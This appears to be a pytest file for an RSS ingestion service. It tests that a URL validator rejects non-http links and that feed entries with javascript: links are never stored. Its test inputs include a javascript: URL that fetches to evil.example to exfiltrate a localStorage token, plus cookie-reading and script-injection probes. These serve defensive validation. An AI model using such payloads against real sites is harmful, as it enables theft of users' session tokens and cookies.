from types import SimpleNamespace

import pytest

from app.services import rss_ingest
from app.services.rss_ingest import _is_http_url, fetch_and_store_source
from tests.conftest import make_source


@pytest.mark.parametrize(
    "url",
    [
        "javascript:alert(1)",
        "javascript:fetch('https://evil.example/steal?t='+localStorage.getItem('insorts_token'))",
        "data:text/html,<script>alert(1)</script>",
        "",
        None,
        "not-a-url",
    ],
)
def test_rejects_non_http_urls(url):
    assert _is_http_url(url) is False


@pytest.mark.parametrize("url", ["https://example.com/a", "http://example.com/a"])
def test_accepts_http_and_https_urls(url):
    assert _is_http_url(url) is True


def _fake_feed(entries):
    return SimpleNamespace(entries=entries)


def test_article_with_a_javascript_link_is_never_stored(db_session, category, monkeypatch):
    source = make_source(db_session, category)
    entries = [
        SimpleNamespace(
            link="javascript:alert(document.cookie)",
            title="Malicious entry",
            author=None,
        ),
        SimpleNamespace(link="https://example.com/real-article", title="Real entry", author=None),
    ]
    monkeypatch.setattr(rss_ingest.feedparser, "parse", lambda url: _fake_feed(entries))
    monkeypatch.setattr(rss_ingest, "_extract_image", lambda entry: None)

    new_articles = fetch_and_store_source(db_session, source, fetch_missing_images=False)

    titles = [a.title for a in new_articles]
    assert "Malicious entry" not in titles
    assert "Real entry" in titles
